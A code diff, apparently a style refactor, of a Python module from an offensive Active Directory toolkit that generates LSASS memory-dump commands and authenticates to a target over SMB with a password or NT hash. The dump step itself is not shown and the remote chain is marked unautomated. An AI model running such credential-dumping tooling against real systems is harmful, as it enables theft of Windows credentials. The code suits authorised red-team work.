@@ -1,5 +1,4 @@
 """Multiple LSASS dump methods: comsvcs.dll, nanodump, PPLdump, MiniDumpWriteDump."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -36,15 +35,15 @@ def run(args: Any) -> int:
 
     if generate_only or not hasattr(args, "target"):
         cmd = _generate_dump_cmd(method)
-        print("[*] LSASS dump command ({}):".format(method))
-        print("  {}".format(cmd))
+        print(f"[*] LSASS dump command ({method}):")
+        print(f"  {cmd}")
         print("\nAvailable methods: {}".format(", ".join(METHODS.keys())))
         return 0
 
     cred = ADCredential.from_args(args)
     target = args.target
 
-    print("[*] Remote LSASS dump → {} (method: {})".format(target, method))
+    print(f"[*] Remote LSASS dump → {target} (method: {method})")
     print("[*] Step 1: Find LSASS PID via WMI")
     print("[*] Step 2: Execute dump method")
     print("[*] Step 3: Download dump file")
@@ -55,21 +54,21 @@ def run(args: Any) -> int:
         from impacket.smbconnection import SMBConnection
         from impacket.dcerpc.v5 import wmi as impacket_wmi
 
-        print("[*] Connecting to {} ...".format(target))
+        print(f"[*] Connecting to {target} ...")
         conn = SMBConnection(target, target)
         if cred.has_hash:
             conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
         else:
             conn.login(cred.username, cred.password or "", cred.domain)
-        print("[+] Authenticated as {}\\{}".format(cred.domain, cred.username))
+        print(f"[+] Authenticated as {cred.domain}\\{cred.username}")
 
         print("[*] Executing dump command...")
         cmd = _generate_dump_cmd(method)
-        print("[*] Command: {}".format(cmd[:80]))
-        print("[!] Full remote execution chain not yet automated — use lsassy module for full pipeline")
+        print(f"[*] Command: {cmd[:80]}")
+        print("[!] Full remote execution chain not yet automated  -  use lsassy module for full pipeline")
         conn.close()
         return 0
 
     except Exception as exc:
-        print("[-] Error: {}".format(exc), file=sys.stderr)
+        print(f"[-] Error: {exc}", file=sys.stderr)
         return 1
